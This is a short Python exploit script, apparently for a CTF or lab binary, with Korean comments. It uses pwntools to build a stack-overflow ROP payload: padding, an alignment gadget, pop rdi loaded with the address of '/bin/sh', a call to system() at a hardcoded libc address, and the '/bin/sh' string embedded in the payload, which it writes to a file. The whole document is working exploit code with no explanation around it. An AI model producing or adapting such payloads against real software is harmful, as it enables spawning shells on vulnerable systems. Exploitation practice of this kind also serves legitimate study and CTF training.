from pwn import *

# 가젯 및 함수 주소
pop_rdi = 0x401253          # pop rdi; ret
ret_align = 0x40101a        # ret (stack alignment)
system_addr = 0x7ffff7e1d290  # system() 실제 주소
binsh_addr = 0x7fffffffdcf8  # 스택에 위치한 "/bin/sh\x00"

# 패딩
ret_padding = b"A" * 64 + b"B" * 8

# 페이로드 구성
payload = (
    ret_padding +
    p64(ret_align) +
    p64(pop_rdi) +
    p64(binsh_addr) +
    p64(system_addr) +
    b"/bin/sh\x00"  # ← 문자열 직접 삽입
)

# 저장
with open("payload", "wb") as f:
    f.write(payload)
    print(f"[*] Payload written. binsh @ {hex(binsh_addr)}")
